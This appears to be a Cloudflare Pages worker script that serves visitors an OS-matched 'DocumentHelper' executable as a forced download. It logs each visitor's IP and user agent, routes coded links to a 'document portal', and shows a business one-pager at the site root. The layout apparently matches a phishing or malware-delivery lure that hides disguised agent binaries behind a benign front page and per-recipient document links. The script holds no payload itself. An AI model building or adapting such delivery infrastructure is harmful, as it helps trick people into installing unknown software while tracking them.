// Cloudflare Pages Functions worker for reyessitework.pages.dev
// Copied into the upload bundle as `_worker.js` by mk-pages-dir.sh.
//
// Routes:
//   /get | /download  -> 302 to the OS-appropriate agent (Windows/macOS/Linux)
//   /dl/<file>        -> force download (Content-Disposition: attachment)
//   /f/<code>         -> document portal (index.html); ?to= handled client-side
//   /                 -> business one-pager (about.html)
//   everything else   -> static asset
export default {
  async fetch(req, env) {
    const ua = req.headers.get('user-agent') || '';
    const u = new URL(req.url);
    const p = u.pathname;

    if (p === '/get' || p === '/download') {
      const f = /Windows/i.test(ua)            ? 'DocumentHelper.exe'
              : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
              : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
              : 'DocumentHelper.exe';
      console.log(JSON.stringify({
        ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
        ua, file: f, path: p
      }));
      return new Response(null, {
        status: 302,
        headers: { Location: '/dl/' + f, 'Cache-Control': 'no-store' }
      });
    }

    if (p.startsWith('/dl/')) {
      const r = await env.ASSETS.fetch(req);
      const h = new Headers(r.headers);
      h.set('Content-Disposition', 'attachment');
      h.set('X-Content-Type-Options', 'nosniff');
      h.set('Cache-Control', 'no-store');
      return new Response(r.body, { status: r.status, headers: h });
    }

    if (/^\/f\/[A-Za-z0-9_-]+$/.test(p)) {
      return env.ASSETS.fetch(new URL('/index.html', u));
    }

    if (p === '/') {
      return env.ASSETS.fetch(new URL('/about.html', u));
    }

    return env.ASSETS.fetch(req);
  }
};
